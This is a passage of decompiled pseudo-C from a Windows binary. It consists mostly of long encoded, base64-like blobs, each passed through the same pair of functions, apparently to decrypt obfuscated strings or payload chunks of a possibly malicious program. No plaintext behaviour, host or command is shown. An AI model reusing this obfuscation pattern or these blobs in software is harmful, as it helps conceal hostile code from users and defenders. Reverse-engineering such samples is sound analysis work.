\"qPjk1bvnOxeHV75woe0YIZIehnHw0a5NW1fbaPSNqQUN4E0fd7DHpXVQWKxn5B+NV7PVNVxVp2/4B4XsdViwZUiVLU+grOXs5CFX+HTkLLiXaLOAAOjkcO4hDiCcoTjFEp/Y7LtCax0pJw07SCu0sPuux+KWlfUAAxpSsOUn6VPxoB64dGecvC3dsCi89pCIAWVchgGlyINuIV1Mp0xppZAbTYin6VgVaI2Vsc3qxOK7O2fuPm9DJwFBI63/CNlcrKpYkBJLZZidobAAyOBuWOilGKxv7G19jBmnT8xoTNGorviMiRiwsHf1fE71rJto9JcuEITtWLApLaBtVwfAd52sSqCIvrNV6G+TfdfcC/QdJGewpahXLmH7UcoCEjQp/Q77O2Sf2EfqdSDHdOVYPfaqVydh+1GHPxLWZUGV0nOGfvOOgp8YuQbqPjNc8i+Yp09QC0g4W+OHV/jZZ5MYreQfMHu15lcHpc7dUN0uG0pLTTsMCQwosrWslTkU4R8Hn+lkntCnPgjOcZILShrxaolk+MVYxjb0gpXikjC8PjnmqjLc8J4Zyox+OaKO0/jx0yVapAxNHweLZz1MpCXVYFUHbwHN4FiVdx/HO31EwqzkHGU4AfXVNVRVp2/4B4UEdViwZUiULT34UEnG5HbhdSEc03hMoliQqHtUhANdTGttvfvlPkCbQPxPayH9saDmL+tkk2tx1WQDaMjje2t+rD7iOK8nlaUIdy/T9oCrmxnlEBnNfCtwac0cAfat2nz7bxBh+78MmE5bV2vVpMtvsfUQxt8DrcCJ\"\n    ;\n    puStack132 = &stack0xffffff98;\n    puStack136 = &stack0xffffffb4;\n    pcStack140 = 0x405fd9;\n    puStack136 = fcn.00401091();\n    pcStack128 = 0xffffffff;\n    puStack132 = NULL;\n    pcStack140 = 0x405fe9;\n    fcn.004011db();\n    pcStack140 = uVar8;\n    if (0xf < in_stack_ffffffc0) {\n        puStack144 = 0x405ff9;\n        fcn.0040b0dd();\n    }\n    pcStack140 = \n    \"sRVspKMnnfAGEbOfL+WsG+0Enz+MWTuteGs0MbZnI2KWD2u9mG8YzKduY1jb/3hududPa0BrfaA8oKAnoeBrtZyk0fVYkx6I2mbPu0hG8LsDBWVz0Q0orOQcs64jbyC8L3HbV6Rzp2OGk/7QYJfGT0qX29jol9bDg5G2g2T3Bstrc9aQY+/la2Rl8cWxn9jxJ0EJ7IsbpwikaxQUa60bZNlJ2uAFpcR38FAcrOQcsHUxHNl6pKhYsPiqwXedzLuhiBfgq3WPXVRv+b07IW+0MUisXJCoddV0T11M4IzgOOA4KeRXG+OwknQbTQSs6VgVaICB2dmVJRxzH8dY2bwYrL1FC/pHJNNV+WsNG0R7fJjbTjm1eGv52rD2kekQ9JsHixtrRi9w01YhvWgNU2zstwMr0PK0rBgnHJkfjD9tLUwhcyy8Jb1s2APbmybYbTyH5VNtWBsJ3PY15NH1XC2Y5Kd77XSIbKfj/RwDQ8d686Jv0wi6deRYO+FQ3VDc9BvFeJGJafnk07I+akfyv5cFpbex01wnRFTD/q8bUgFVTAigH8dPhlOTXLNLt68ibS1IW718nOn4Gc18nXDvDEg4sLX7T8bnS7eri5Gk4Fu9FJzp+BtQAUVMZVPvvDG1rBgWZlAf9c2kuPCkQLOVqPjHA3jwER53H2jn4p/RlakItwcB7Ff1avkLb70sncmIk35rUAhCtrWsnXeQJh+NbBstpM5Xp+Wkq2+d7BXx4A0gTK3fv0InL/SDBosbZXikqFjlpHPFlAPTWF92H8c7Tf/nucQSofiLkaRP\"\n    ;\n    puStack144 = &stack0xffffff8c;\n    puStack148 = &stack0xffffffa8;\n    pcStack152 = 0x406010;\n    puStack148 = fcn.00401091();\n    pcStack140 = 0xffffffff;\n    puStack144 = NULL;\n    pcStack152 = 0x406020;\n    fcn.004011db();\n    if (0xf < unaff_EDI) {\n        pcStack152 = puStack96;\n        puStack156 = 0x406030;\n        fcn.0040b0dd();\n    }\n    pcStack152 = \n    \"sYhW0ahz5XB3bUQfncA28bUn1kStHOD4/yMH7v8jvc1rqfqAdw3sGcjgaE+gvOPs5N+yEHbkWLD9aw0bRAflgOIY4R+dXMbwtS/coLnftXOYGy249vmnhdwG0IgL3Ly9S7FSsEq5RFWkHLAHYSCl8KRr6NEg+dF2SCTqnn9QWTi07eZs2GaeD8TU0LHlVpiskYZn7k8Zm89LtbNcNkBQ/7KXlfD/PQ87XiUVKCGFbGA2508f4uNhi0zeUicjLzIPhW0dSKseUx3W+58+yxlxAYDj8L8D7xptBRSK/HcsAjtlabGWKxivAswdCGiPr3LFWydlUGff43ub59t2oFcVaCGFbP03nU+UzWozM0qtbqrrqqP5n+ZrcKsekR3++1FpgBcGIIsoUrR0TRD3b90hEXJnuI8u7F0oIPraw/32dqaL3btPtNkcaqIe3Xuy4HPFrPfTVvajG23V2+O2BeQpg277K35v5MsB/xZjeKvvoxVXjKYCiSSAkozcAcaQkHne4CCajmnYGcKglALmvcTu/JkknZSF3BbEvJBH2OGfIvuf5Rrx4pOv4mKnzgNKQ3O1Awy7XKX/TicV26UIRNVqgy/lUKNzr1fNfCyF1r9tPKZy6eCU3V2ic4wjHUzn7B3WgwajWrPov6dzZcfE4CYekNRu5MRNkhqMxdpcrNKOqrTJarTc0pYKjMvYNpDJaMrEWpB+jPvcelap3Z8+jtlY5AKkPUA97RmjUhpjGHtuHLVUIBmSKzmTY4uQsaHOogNnxwcz4exDvnO1v9NV+WsNG0R7fJzbkypE\"\n    ;\n    puStack156 = &stack0xffffff80;\n    puStack160 = &stack0xffffff9c;\n    pcStack164 = 0x406047;\n    puStack160 = fcn.00401091();\n    pcStack152 = 0xffffffff;\n    puStack156 = NULL;\n    pcStack164 = 0x406057;\n    fcn.004011db();\n    if (0xf < pcStack88) {\n        pcStack164 = puStack108;\n        puStack168 = 0x406067;\n        fcn.0040b0dd();\n    }\n    pcStack164 = \n    \"iOA4O3SHWpiyl1JYdORYs1UhFWirJhnNdJHtELMTS/3iIV6obyRtrnznpjnhRGNH28wb1XQXB+IDKP/1QaworOSdAQd75FiVpFhYkKv2k8VwfoulfJU6sawv2q7fy5It/7moO+FEW6CTC+I910bra229++U+QEn9b55g+HTkCzt9/g8VaIz5CzKcsOCI4EzQOJgAR7AfI6iL8cBM5KjTQCGtaA1abONrtmt2oLZXG2dtURwTX51dvxNos5UrOJKLS0jiH51MwvC1J9ApLWjLczEY23egIw1oIfATSIyR9RwD571wwGObavCXpvTxJC0Vl2gYz/ajG23V24MgYxW7SvXfG58k31i1LuRY1p2pLWMjuayLSZmIsM3gOMVTFhOt5BzTMRLdCKir7ZlT/XN8C2QIOyHfaX1MXW3nUxuXGHEJFN1PqyzqkKj4xuLIcLDQiODHx+XGGFPx7B24dG+oNVKn3AKo+JCHP1ekbc/4s+VJr9mjU1Pmq4uTDNt9gNNeIb1oi1Dw3Bx3H2E7+FQjZ5ddyyH/maQ95bhrQiG9ZOKglfMfA73M6UJdWCWh5GvzTa+gO/esV9LjAJNf2ZP7HIsu0J9JU+dTqeRto1y9LW4v1agbf3NeYJLmTx8DN7N+XSLmUxtHZTgB6zCwJKhYwP4HhdxxWLDTfmv+7uon/fEndOB4dOQysPVXTcRRuJBLA1mMa8zoELN0b00nCJ0M1HbkWObzwlj6qnNqd53ASaCIa8gzS1Ns6GmZNAWLG581cFWnb4T6kIjYTk/18Bx4sF6ilSkw4R8H\"\n    ;\n    puStack168 = &stack0xffffff74;\n    puStack172 = &stack0xffffff90;\n    pcStack176 = 0x40607e;\n    puStack172 = fcn.00401091();\n    pcStack164 = 0xffffffff;\n    puStack168 = NULL;\n    pcStack176 = 0x40608e;\n    fcn.004011db();\n    if (0xf < puStack100) {\n        pcStack176 = puStack120;\n        puStack180 = 0x40609e;\n        fcn.0040b0dd();\n    }\n    pcStack176 = \n    \"JLKnpTBTGJAtOOSZ35U1NHUfx+BdFxCs5Jkgjamyp6WUUhiQ96YbbdXb5WtkY9SkPm1L+rOX2HmDXYRegCEdbCM/GfV4m1Dj/eW1x7FHHycTNxB7suDTfky8o29Xc0gB1fQ1O/yCs/VJJ8svgeDge7Tg29VQqJl+qnWcOAPpmxALJjtxW64jbetblQTxEiyEL/WsG1BznwX3HDERMTzWlD2mk20l9Oh1JuCZWbQgGm0gsm5JYRDzaMIfA27He5PRFJe9FLLgY7D79tNT83N11UtNOwwLDCDjPnWTbrJLab2Eb2ODXCOfGdUUE2iLbbVt/+TTtz5bM1xn2uR1eNKw3l5Xpxt4ccVgDcrEkwuFwLA47xwvgeDgOZrm1bwUI6obcdNIC0sbcQuK2/m/8vHgKT9opnMhFNNIL6fV76zLWoc+2dZpjmv5cV2kldrsE1Y4Em0eSmVBSJ8eOfYBzuRxCYDvjnHTJV5Sb1kcuP2hpItn2p0b1RQb3WArcIYB5ELv6yfa92/5vTudwKJPW/3TfCO9mItKkaFpyeRlc+An9P+zl9lzrm8JtJ9SK4n+9ya/A95xCItj3rc8r5Pp7JXQdTPl0bH6kUnPszhnUNNFc7UDDGnj4yfpH2RL0zH97tPOoJFm44hzlgKQWDmldGk+vwNvm0ybzwDxdmCDyawrmZeRhWz6aBcGI0kIP+9CfEYvBB27c5G5m+Mvcg7HIwmjdwVLtAgvH8dPMGxsvG8ea/Z3JWP2oN9dGaO/GY4D3+++0yNtO1knGWwGH+qtfGxI8C2pBVMrAu/+\"\n    ;\n    puStack180 = &stack0xffffff68;\n    puStack184 = &stack0xffffff84;\n    pcStack188 = 0x4060b5;\n    puStack184 = fcn.00401091();\n    pcStack176 = 0xffffffff;\n    puStack180 = NULL;\n    pcStack188 = 0x4060c5;\n    fcn.004011db();\n    if (0xf < puStack112) {\n        pcStack188 = puStack132;\n        puStack192 = 0x4060d5;\n        fcn.0040b0dd();\n    }\n    pcStack188 = \n    \"n0470QIiNDB0Rh8k4pGm+f3l20rb37POI/kQaveQoKAB4fvlPkCTvW9Z6HF2bx28LepcHerwGYnV2+VrZLNu5z7RECcWlzdzrQz2T1tX05sjLsdgZuBPH4nbYe/r90Vvbx1p6PckXDmla2tQ6DujSMjztCFh53gzTNNvWyeXsfz/LrBXW1enk2o7+ozQ2+VrZLazxb368OMb4x97sODbXqTcYt7c3d78mZte4/36s+W5JwryufVGB4sb0+WoVyqUI+p4+3fnT7nWvfs78KDn3ODj0BA/G6dPJ2xQe0NzxYTWk6K9YfPHT0r5k0Bn8LSuI2+qO13CHMoltTxgouBPHwWlyHfwAFys5BywdTFICINk+AjA+KjA3t/npTRzoDg1ddg/J5kQZQcA6NXFVA39NQ3LUMhjDk+VeB8tgE/sGFOR6B/tRB4YsE9Pa1D3phtt1dvla2Rj1Pjm+k/GoENrIvmp4INSI48Z3QR4M3/nT2n1WLPNuSnn2LemMwppz+HQROhYeFkEb3fekfUgBaXE5+VTDQTvXeB9tJB/T9G41dUQqMZ3/eTY4IzgOObj+kv6s+P12IWkWE/RVNNgV+3kg8kYO61ICF5NSlPzsRtp8HUxXAjmW92k+Kj8kIjeTuaz3h8tZE7sGCcUQ2s+Kr/TVflrDRtEqcYFzeQ7EdgfLdhO7Bj8Gwk49zXk3XDQvQ76qgfldHcNxBPI4MfFSVMNnB5c4Mu0pAY7QfWb9AnIkIiIkzA0ieA4c9ytdeIiXeXBRORYOaVpsICNB++IiNvla2Rj1Pjm+k+f\"\n    ;\n    puStack192 = &stack0xffffff5c;\n    puStack196 = &stack0xffffff78;\n    pcStack200 = 0x4060ec;\n    puStack196 = fcn.00401091();\n    pcStack188 = 0xffffffff;\n    puStack192 = NULL;\n    pcStack200 = 0x4060fc;\n    fcn.004011db();\n    if (0xf < puStack124) {\n        pcStack200 = puStack144;\n        puStack204 = 0x40610c;\n        fcn.0040b0dd();\n    }\n    pcStack200 = \n    \"G5WtAP8+00dbvQhs6PgZzXSo8WjM1YD2S2wk9prpUJn8oG0I4laYrNKGZTi4kPTVMKbGcImVZllhx5Tj+amkWDhXp2+bKhvFcO9Gasz1gDixo1+XH24Fpyq/01X5aw0bRHl8AIgYsLPetwtPPOHkJz6XFwdhtKTwpMIZGe0AyO4BnMWYdx/H9vXKm1S+ahCSFbw+OSDdIG9XB9bI7ptImv4QUoDtypEokWQfB4uiGNYnUGHmWH1L/KiV/Rhg/8dPSp/KJ6ngFw4Sb9zl3Fenb85xlPHPI0uSaL9m6z5JRW+xlwx7mJQOPeFUn9VUlJCIiEg9pRjTzuDf7HKttU4f7YwUGLAhaCyGI62YBcXjOuEA4nr5OOmElyxvE8uCotN2+iO9zWutG2TZcrBtzRz/9Um4GKzkTLKSdrWnpURcGJAjHc1L3ZNcsdm2b9j1rBhcjgTTByOzMCC16VgbXweFgHxYsGVIlGM98FRIIaHgsK8c5NiwpMIy+AAQ0IjiC9jhiOE4T6A87uzkmSCMXIzMoeWoD8dXjWh3/eRP1RjxebBKudRcpBwfjYhvqE+xCKPQqH1m/YVPT9UY8XmwSrnAQ6Qcv3OyutNV+WuU+riiKRiZWbAIchTHT+REflMb47l9tJA82Dy5GZDC+fiG7hiwH71wKfG1Uw38EFzgfbSQdtg4uRmQwvj6iOAcMOCIHw0gpO0YU/HcD7h0YZjEoJuY0GsHpRCZWbAfnTzM8LVTLTj1XeAHYTis8KTCWG+daIHJiOelOGegOIN1b00nCJ8M6P8m0fVc+w4b\"\n    ;\n    puStack204 = &stack0xffffff50;\n    puStack208 = &stack0xffffff6c;\n    pcStack212 = 0x406123;\n    puStack208 = fcn.00401091();\n    pcStack200 = 0xffffffff;\n    puStack204 = NULL;\n    pcStack212 = 0x406133;\n    fcn.004011db();\n    if (0xf < puStack136) {\n        pcStack212 = puStack156;\n        puStack216 = 0x406143;\n        fcn.0040b0dd();\n    }\n    pcStack212 = \n    \"6PzHBdAZRiOHlD4zVlybb/SXnfD5ryw54VxrZiG3lGDN7E8fAaXIObIp2KNgi+D4dGeYxC3tpB3t8MDe3ueFfJmhOE+glPfs5JkgjBlvDUgv5aRv2vwbmmAhRB93uWs98FhIU5Hg0zgipAhP0aCnpTDp0Yh3DVQSyOC9cMGDk/EUl/VgZaVYO6k8SdGoq3h9dedPuQ0gTKXkJ1WkaU+AEF0ap0/9LZj6qaCfzXjnxeh39fBA9aydWpESa/ecDKtPWyt/kCuflIjXk3a+02vd7Xb5k0C1TWs6Im0dSPMjGJSbBx34BJtIlPvnC3BcEhis5Jcuc6JnuUAvbttRuHhyh4ddcdt4ldvjPvEQJyqVk/ycsKtPWyFbFWj3FAWIGLBrzRizsDzp4CGh4LCSdI5YT5E0SdGoB4WwZ1iwZUiUZTvgVJOnZ96Urpytq09b8dXjrMtQ3ncr8IqIsMfFSVMtNPVd4AdhuKzwpC2Y5IiSkOKI54V0maE42tVTbVQbaRwHYZip8KQtmPqpoJ/NcOfFHHf18ED1rJ1TkQ4L+/mXXDuvQFtjVwcTq4ibluADJ2Pv6yf98Sf36sHl6FqwpNxRG6F9Wf16K3AjuyB4c+An9P+yl5XwI2kelC9g0dWgEGZmd+cznoDgs2jB+ee5wOag+E2iUMTuKyaIqIzUd508SqCI2X6owZWT0eiXM3N7DPtPW1fdUN3RKZiKGLAIwRLHTz5cnVqQBR+NfGkWtPVXTZhUuJABFhSy4IhrNzm7JS/z19y+uC+5mrik/dN8KxSA2wPBPbV00/E5\"\n    ;\n    puStack216 = &stack0xffffff44;\n    puStack220 = &stack0xffffff60;\n    pcStack224 = 0x40615a;\n    puStack220 = fcn.00401091();\n    pcStack212 = 0xffffffff;\n    puStack216 = NULL;\n    pcStack224 = 0x40616a;\n    fcn.004011db();\n    if (0xf < puStack148) {\n        pcStack224 = puStack168;\n        puStack228 = 0x40617a;\n        fcn.0040b0dd();\n    }\n    pcStack224 = \n    \"6FhO+2lf5HE5GNH9XCOhGaNx1XgBEFinfh/HO8BQnVqQB2sn+aJc4Fu9hGno+Bu+yxtoZX6V1TnoVJPxEJetAHctsHpVV6cZ7QAVSPxfO710Cxw9xqhOIeBksAdh7KTwpP6nhXQB0IiL4DulcIoU6dMlFNSjl/t9r5GAT9FY00D/EC2IiBg7vXy5YTv4VJGvDKARB4tvFUwhYSydI8l4JnnnT2tGZc7FRp/YledDvvfhJAM7QfWbxSMUEWTIGbDgBWX4TkpT3ykk4h8HaOVYsPRXTcRWuJAFzcTgH50kxPC1o67pPhNXtaiPmNSnLZxuVwf7SIIbNSh2H8fbdcgbbW/5vTsnsg+DZCOCwPiSb9vYSDsQd/UMTfWsk1Rh45Tl+ehnWE1Yp28jCBV+/BfntuIfa9q1xhhT8SgduHS703b685vFIxTD3t8rcGtSsGjg5VNtpG/ss6gcDaWwpFdNiFS4kANwnU+UpGv3WBRc51Nv7GUOAPtrcPT4D8ZXjZjb2HBZHYjgx6WtUFisb1nsfbSQWjmc99NW9qPNS92TXLHZa3245vqTXW/G0yrNVE2wpF+px6dPbgNC2V7wAa3ENW7ZEJ8kXAlWdORYM9mgWJ8sZpCIiCtiY3HnTubfq0CHJ5WlAHtSWzNmoFtop07TiYvvsxiHVnuytlsbVOuqo/t3E1tIqx4blKsPk3CHrvPlixc7SLoaW6rn6+MAe1Ibt6df21Og+2gDzeCzI4sXA3HHHiN9lw5rOV8mVwavq6HTqw/Y/X2T/RwDJwtiCl3nrOTrF3OyWqlP\"\n    ;\n    puStack228 = &stack0xffffff38;\n    puStack232 = &stack0xffffff54;\n    pcStack236 = 0x406191;\n    puStack232 = fcn.00401091();\n    pcStack224 = 0xffffffff;\n    puStack228 = NULL;\n    pcStack236 = 0x4061a1;\n    fcn.004011db();\n    if (0xf < puStack160) {\n        pcStack236 = puStack180;\n        puStack240 = 0x4061b1;\n        fcn.0040b0dd();\n    }\n    pcStack236 = \n    \"pKjTapsqZ36hVbhZOPU4sD5ekeEYE2WaixuncUK41ZSfp87TA/3tI91r1DvwoBcDoQywknwbTexd6FjAV+2Ac8gY7SPda9RPwKByrBsJvAE05AhPsWyl0KilUwtkCFjkiOA4M3G82/qzTWsJnMB9sKQjoBNs/BFHiDiw4A0WTbXfUkBHjC8gy72l0faIIRagIb6IAc4sOaaAaX6kjOo42ePbptgVwRiwne585a8/1qz1PfDg4KDntLX959rM47bY9yBUNWTdXPpUEyff2ZN4ac780D2WrBj1vZkgjHpvllgSqFiQEAhId3fzstNIv2Zz4Cf0/bVKt3OF16c1UqfcHqj4kAPGBDUph2S7sLWsIdLoaJ5zIvTdYtGsMmtDjRPx5BnF5bsgeFveJU1UDw5jAnWQATvquN1Z3LYZxXCT/vwDpjw7oyVdUGlZGJJwtKfGqCUdbPgQ2qmIGDswCyQoO/BQGarNWuT5MuzT/rhAR7So+BnOuJP1GImmNJnzvBnq8Jkygd2Opu8vb7OYmwfXY39yTrjXvrNV6G9OJxWZFo1xjqbo+mvb7rT45Id3bqwf/sjH5pEvfrDkRbnLtLqbO26bisYjOS6I9BiwF35tiTW1rBifNncg/R6AW0DPaTbJXwkTYAgjdu/PELN2629NJwifDMT5oZzm88Jg+qioG3ID6U/1NB54sD67m2jol630/yZTcSdQp+avQGBQd+dbqAOlMDn4ZJXhIJWlPP2RiDnxfLC0VgdvDUhtnW3FJNAdS1PnJxSRrTz3GlnEtUAQb1cH+nPQnUbv\"\n    ;\n    puStack240 = &stack0xffffff2c;\n    puStack244 = &stack0xffffff48;\n    pcStack248 = 0x4061c8;\n    puStack244 = fcn.00401091();\n    pcStack236 = 0xffffffff;\n    puStack240 = NULL;\n    pcStack248 = 0x4061d8;\n    fcn.004011db();\n    if (0xf < puStack172) {\n        pcStack248 = puStack192;\n        puStack252 = 0x4061e8;\n        fcn.0040b0dd();\n    }\n    pcStack248 = \n    \"zBCzdl6mk+k8lecQRhunT/v203X1O8UDZElPlYQfTbhd3edTG58k9Ckn02FNnqdvV64beQ3uxeXiHmDudvsrU21izHEK1NHOvCEmmCGGhAH2LImeqJU/d/OMeYmkHNmGUJFfd+KMJbXo+MO7U3C4S4jge+NK2jBTsjxjPHhhmMWhwqTIQ9cZzpSRiGkwEBKwtSWgWM4c4HHs4POwpCHAaIL4kAEw5JrgiCe4sJ6sGKPkHODLtL8H7mdBK29XB8UDZJtc9Nu2bztMxhD2YePvfHDmWLAv90QVc/cUcYkYsNNB2bOwnqwYxu1E77ekbx+0Le2oGysAuoiIkeUMAWvAmrWsISfgt+D4CeMyTU1hWZCoy2bOgatMyojgvXDBxJPr4J8q/P2hpDtvIx+A+nOHAc3gPaVwsMfHuSFdUBtr7KicGnmwpCMVbCs8hAELHBvgiOE3mfqoGePsl6vk/atoO+lQWd+k0d+YiVekZUiYo8S7L5OoTxzgBx4fseulqFgbbhHFiYgYO2N8yjiwMGxsym9r8MOy6xpALyuouqj4lYyjGLC2iyNoT8Kg57mQ4qD4dZNUM2Ckcee4+eecA5tAyojgEQNBhhis59rFBwvkWDMfrPOQqPgZC3gysOD98bsLQYYYrORp6Mu0pLFcpKhYo2gRdYiIGDunjG2LtJ6sGCdv7Mr4dG0dTByo2JCo01EBzeA9pXCys6flIZuozxzg+7Vvk+Ap7aTG+BCFqYgYO610abu0HqwYres1r/x1q1A777TR35hz3XABk0TKiOCzx6WX1iWh6Gt7\"\n    ;\n    puStack252 = &stack0xffffff20;\n    puStack256 = &stack0xffffff3c;\n    pcStack260 = 0x4061ff;\n    puStack256 = fcn.00401091();\n    pcStack248 = 0xffffffff;\n    puStack252 = NULL;\n    pcStack260 = 0x40620f;\n    fcn.004011db();\n    if (0xf < puStack184) {\n        pcStack260 = puStack204;\n        puStack264 = 0x40621f;\n        fcn.0040b0dd();\n    }\n    pcStack260 = \n    \"hM5YsKvqqZWs05CI3htzsHeXNE+g2Obs5B2X9PcgeJnTuFnnvHMTeKIYsMk7FBKwta/eJ6noxQcL5Fg7N1xykKhxE3iiGLBlQe+w00tT558kXNswAe7bzVSoVxRoBm93DdHE8gufKLC6KKpSG+NrrZgNcE9bVzJrLSrJh83ZW+PiHmDv6/eTSbnftXOYZ7SIKe2Qxv+SqOKISDsaAxHHpQlSWKxvC2M8eG8VvC9qU1ErAG/+j6BAOHcf0/4+6RAlqdBttbxtHXgt3YwZ/SB4BnXnT2VIlQs9+GTwKxnjH3OEaRV4J1ZZ5L8QbHN35zMec5UxM8hgGNnndh2m/yKzui/thBmvEHBzd+fvvgMFZXPgJ/QtCADs+HS3DufOqgb4qPCQiAWdVBN3H7Np36xIJx6VvQiL8eRO5KjbVKTLQg1TbJPvP+yvvwNt2UXsnQEHdORYTyAtvGNXB28MBfxHH3eiA2PHcZUpAOsfB0/8LbvqhViUqPgTdolvQWPtGDg5wFidWuuYSfh05NP9VCXNdFsHbwUV/Esfd2v6m20lRUDX3Ce9iORZsKQhXIOr+hNKjOf9HP0Tu9VRrJH5DJkpjCdvHUgv9agb/Rwb/YAXBygBrcS/AqiPfww5H/h05NM8IUyjb1dzlB8BHD7vP+SvOvhQy0RvURzdi+RYsFss3XRTB2/Ks8vCKwOVzDvgRJPxCJetCPehoLglQ1iUqPgbTwFFXGv16HY58KSR2RATZZWLG6c7Y/cGyyMdzUvdk1yx2bezSjBTFyg8HOD4Iteu9p9WLZjOcaFh\"\n    ;\n    puStack264 = &stack0xffffff14;\n    puStack268 = &stack0xffffff30;\n    pcStack272 = 0x406236;\n    puStack268 = fcn.00401091();\n    pcStack260 = 0xffffffff;\n    puStack264 = NULL;\n    pcStack272 = 0x406246;\n    fcn.004011db();\n    if (0xf < puStack196) {\n        pcStack272 = puStack216;\n        puStack276 = 0x406256;\n        fcn.0040b0dd();\n    }\n    pcStack272 = \n    \"Txiw4O5rebQ+en6t5ZGnB/eBoLAt7aTDwvrLs05m6mv9GANvyL0XG+CFhsFwVSq3wiFcAesTne4DHAGGAeSp1jy4qerfw53hTxYlusIjXCHOw5QR+hPWa4x5XrGxPVtH6Xpr/MWCWbQ1ztGEGb7SBc/nizD0TAtG8yFHUtfcYz+JgtG0PdBJnx/8Ke4DHDGGyIaxtAzjYUPX49Mq8T8gvKsfXAmTP+WMylPJFLMSRqA+6eSHFnppxPWsFsVcIR1sJcyCz7vKNRb3MmPu6if98SdJaxQi15g7Vf8Yo1fDQPbXk+Xo221ysTZVONPrl/xud/jW8S20zhNR2O58A8I1Mvbzs7QrJ9KHL88A+4yv3WvbWGtQ6HNaW2hDixj8whNISqCOIabjC//32N6w0a8QFWiHZWOA57xmC6S+tLfjbUy7Qr07IW+0MUiwUpCoq8bf4Jyw4IhtvdxKU+cnFpc5cQEYMrD0IQVkV+0sdsgYO52AY/y8NtEIrJA30zHxG1c+u6lYkMEusImIGLMzh1a8uqcjGKwbmGWUixun8Z9nJHxBBpCIiHH1HMjiOLCGWpHpFJH04Eck3U/ai1cnJLoCCYgY1mVBlCnWPCCtxB7jH579YO3aXlen1ujDV/RVlTUIfR/HO3v8lTmM5h8HnCOkT1vx00YhvYADQPBWHXcfC3kwWma/b0nw98Pg0k8gLTRvVwfRs0ZkQB/97LNmOCF0UxvjCFKKG6fZ4VR4kaj4V4ysOLHgiIo4OfBUHb5rHOD7t7SnpRhWGJAjvWDgyBqw4I2ysLC1r9vG\"\n    ;\n    puStack276 = &stack0xffffff08;\n    puStack280 = &stack0xffffff24;\n    pcStack284 = 0x40626d;\n    puStack280 = fcn.00401091();\n    pcStack272 = 0xffffffff;\n    puStack276 = NULL;\n    pcStack284 = 0x40627d;\n    fcn.004011db();\n    if (0xf < puStack208) {\n        pcStack284 = puStack228;\n        puStack288 = 0x40628d;\n        fcn.0040b0dd();\n    }\n    pcStack284 = \n    \"5Ewf7cgaGLAv7VSjeroTTJAjcpy+a7Ql2VPnU2HVntv/mUgzY6rVrB/TYQX35L9Xj+N9SPwkjLT2k+D48S0nWy/tVNKTKO5FA2W4Yy0Mxk9KrCt+b2nse4rmJKmXYRaTPPXgd3fnPamM4+o5IaH0Uhvjro2e14o1W9Y/+e0EsImIGDmlmOUqP7WsG29tWRj3wtBIg20hFZwtDuTJA4QFCHYfxz32rZEoUfQeB4uaQztdI5OTV3txiVnzuxnGZc7PRSVloG9h6HM56NP1tCMFZKs69gEEW+JoiOCz9U3uI3uYsb+mL2+97Wf903wpFDCKiBjjtt/TznbwXOcnHS87rh7rG4N2wHiRqPj2AReKM+CICO5NSlNOxut2wHOnb5dYbFWnbys8iDOWGbDgCFwnoTqsGKyRFat5j+VZsKTXtfq2cc180JgM57lwOLC12R7kZ+Thh4RtHVQpL0ofqPjD2AWd0B13H2hPoNjm7OTjlRz5Y2ogpKgIHS2YbXd3G3Owd/VMTvWsk+kAHyNzqm0dUC9uMrYhvWgBzeQ9Z5pmOLDj/Oe5WOKg+PcgfDnRQGHNSPcW1ooYsGrNELP9XSaMoYThHwf8sbQ0dqfdE6j4kAPF5DUp/Ku7SbbfPaNS3LEHARQ+sSjvShao+B0NKOZPH4sjaFi6NxisZ9js+ykYs6zCV9+iLviQCGEbdmSVQMZPSryQIPm9HgeLZ5uyL27R1VRz3XADTUyhAa3AMUwmGKzkE2XmdeRY1lsvbhao+BtG7t80/Sgex0+n05HhHPXg+XTk0/1cLZHk\"\n    ;\n    puStack288 = &stack0xfffffefc;\n    puStack292 = &stack0xffffff18;\n    pcStack296 = 0x4062a4;\n    puStack292 = fcn.00401091();\n    pcStack284 = 0xffffffff;\n    puStack288 = NULL;\n    pcStack296 = 0x4062b4;\n    fcn.004011db();\n    if (0xf < puStack220) {\n        pcStack296 = puStack240;\n        puStack300 = 0x4062c4;\n        fcn.0040b0dd();\n    }\n    pcStack296 = \n    \"zntpi/s81uEH8r6wtSGdDBrjH6l3Jw7gTDrCkKhz1XAL3Lxq3Qw7aF6Zm1Xua/Sei2NsNqSo2HmrPhSVKOZPH5kLKtZKKy4q5BxgEX8i3K0EVqdvunAclSnmTx8LIzo68FyTYm1RGMKkkDU76VTdWdy2E3GLa5jvPiBpT8Bcfq1oW/J+dOTVNQRWp2+rO8Bgk4Kw4AK11DNxoBvxGPf8notjajakqNh5qz4UlSjmTx+YaLStFFLnU2ff4nOybR1Mqx6aGDzlMHZ35zu1dIbHNPK+nqzkXwvd/7Gk8i39pBNS/uWR7uc30g7gODtjyt8o+bweB4v0WznxVNtTqnL1ZHddWGpMa3VQjOHwJ6nkaL2E69r7WlenFXqM1QtyG8PFh1b84krZ9MrliKfq8uRYPSEIpm9X+1PYYGop4Ihj/Ly28eRHnHoff0ZiWLAkQltWLOUwdnfnoGgc/ZlOSlPz9mHVlKH3HVvDu85ZH7p+kIgFnRAedx9ps3b6SETLheD49yBUs/lQs6UrAZr/nH5PZ7xmOLA1RRtqYAFABosbSVu2zqcXnn6QiAjxuyYM/ZhOSlMKJGgBQQaLG9tzpv4yl8Lr+orWk2ZrRwj+SkpTk+OgnyT0pwJRx+zCoM7C8B3JikI5p8zb+sKpJ1ec31PUi3xuH/gsqafXmDn/wIAZx6Sxt3zDUSdX6G9ZFP2LGqdPd0hR1+B10Y0BX/TbSpIkO/qcI+PQb+hyM6zQsVvvaFHHsJiJ/1yJt8yT3Dv66JPpAFQzGH2jED3lrdHX7MNS+pST/9CzrwzD\"\n    ;\n    puStack300 = &stack0xfffffef0;\n    puStack304 = &stack0xffffff0c;\n    pcStack308 = 0x4062db;\n    puStack304 = fcn.00401091();\n    pcStack296 = 0xffffffff;\n    puStack300 = NULL;\n    pcStack308 = 0x4062eb;\n    fcn.004011db();\n    if (0xf < puStack232) {\n        pcStack308 = puStack252;\n        puStack312 = 0x4062fb;\n        fcn.0040b0dd();\n    }\n    pcStack308 = \n    